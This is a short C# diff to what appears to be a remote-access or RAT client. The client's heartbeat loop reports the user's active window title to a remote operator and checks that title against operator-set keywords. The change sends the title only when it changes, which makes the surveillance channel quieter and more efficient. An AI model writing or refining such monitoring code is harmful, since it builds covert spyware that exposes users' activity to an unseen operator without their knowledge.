@@ -986,6 +986,7 @@ internal class TlsClient : IDisposable
     private static extern int GetWindowTextW(nint hwnd, System.Text.StringBuilder sb, int max);
 
     private static string _lastActiveTitle = "";
+    private static string _lastSentTitle   = "";
     private static int _activeSkipCounter;
     private static readonly System.Text.StringBuilder _activeWindowSb = new(256);
 
@@ -1327,11 +1328,16 @@ internal class TlsClient : IDisposable
                 await Task.Delay(Config.HeartbeatIntervalMs, ct);
                 await WritePacketAsync(_heartbeatPacket, ct);
 
-                // Send active window every heartbeat (3 s)
+                // Send active window only when it changes — GetActiveWindowTitle polls Win32
+                // every 3 ticks (9 s) and returns the cached value on skipped ticks, so 2 of
+                // every 3 sends would carry the same string without this guard.
                 var title = GetActiveWindowTitle();
-                if (!string.IsNullOrEmpty(title))
+                if (!string.IsNullOrEmpty(title) && title != _lastSentTitle)
+                {
+                    _lastSentTitle = title;
                     _ = WritePacketAsync(new Packet { Type = PacketType.ActiveWindow, Data = title },
                                          CancellationToken.None);
+                }
 
                 // Window Notify — check active window against operator keywords
                 var wnKws = _winNotifyKeywords;
